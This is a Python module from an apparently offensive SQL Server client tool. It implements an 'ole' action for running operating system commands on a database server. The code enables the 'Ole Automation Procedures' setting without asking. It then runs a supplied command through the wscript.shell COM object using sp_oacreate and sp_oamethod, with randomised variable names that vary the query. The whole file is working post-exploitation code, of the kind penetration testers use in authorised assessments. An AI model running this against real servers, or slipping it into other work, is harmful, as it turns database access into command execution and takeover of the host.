"""
OLE action for executing operating system commands via OLE Automation.
"""

from typing import Optional, List
from loguru import logger

from mssqlclient_ng.src.actions.base import BaseAction
from mssqlclient_ng.src.actions.factory import ActionFactory
from mssqlclient_ng.src.services.database import DatabaseContext
from mssqlclient_ng.src.utils import common


@ActionFactory.register(
    "ole", "Execute operating system commands via OLE Automation Procedures"
)
class ObjectLinkingEmbedding(BaseAction):
    """
    Execute operating system commands on the SQL Server using OLE Automation.

    OLE (Object Linking and Embedding) is a Microsoft technology that allows embedding
    and linking to documents and objects. In the context of SQL Server, OLE Automation
    Procedures enable interaction with COM objects from within SQL Server. These objects
    can perform tasks outside the database, such as file manipulation, network operations,
    or other system-level activities.

    This action uses sp_oacreate, sp_oamethod, and sp_oadestroy to interact with the
    wscript.shell COM object for command execution.
    """

    def __init__(self):
        super().__init__()
        self._command: Optional[str] = None

    def validate_arguments(self, additional_arguments: str) -> None:
        """
        Validate that a command is provided.

        Args:
            additional_arguments: The operating system command to execute

        Raises:
            ValueError: If no command is provided
        """
        if not additional_arguments or not additional_arguments.strip():
            raise ValueError(
                "A command must be provided for OLE execution. Usage: <command>"
            )

        self._command = additional_arguments.strip()

    def execute(self, database_context: DatabaseContext) -> Optional[List[str]]:
        """
        Execute the provided command using OLE Automation Procedures.

        This method:
        1. Enables 'Ole Automation Procedures' if disabled
        2. Creates a wscript.shell COM object using sp_oacreate
        3. Executes the command using sp_oamethod
        4. Destroys the COM object using sp_oadestroy

        Args:
            database_context: The database context containing QueryService and ConfigService

        Returns:
            None (OLE execution does not return output)
        """
        logger.info(f"Executing OLE command: {self._command}")

        # Ensure 'Ole Automation Procedures' are enabled
        if not database_context.config_service.set_configuration_option(
            "Ole Automation Procedures", 1
        ):
            logger.error(
                "Unable to enable Ole Automation Procedures. Ensure you have the necessary permissions."
            )
            return None

        # Generate two random variable names (6 characters each)
        output_var = common.generate_random_string(6)
        program_var = common.generate_random_string(6)

        # Escape single quotes in the command
        escaped_command = self._command.replace("'", "''")

        # Construct the OLE Automation query
        query = (
            f"DECLARE @{output_var} INT; "
            f"DECLARE @{program_var} VARCHAR(255); "
            f"SET @{program_var} = 'Run(\"{escaped_command}\")'; "
            f"EXEC sp_oacreate 'wscript.shell', @{output_var} OUT; "
            f"EXEC sp_oamethod @{output_var}, @{program_var}; "
            f"EXEC sp_oadestroy @{output_var};"
        )

        try:
            print()  # Spacing before execution
            logger.info("Executing OLE Automation query")

            database_context.query_service.execute_non_processing(query)

            return None
        except Exception as e:
            logger.error(f"Error executing OLE command: {e}")
            return None
        finally:
            print()  # Spacing after execution

    def get_arguments(self) -> List[str]:
        """
        Get the list of arguments for this action.

        Returns:
            List of argument descriptions
        """
        return ["Operating system command to execute via OLE Automation"]
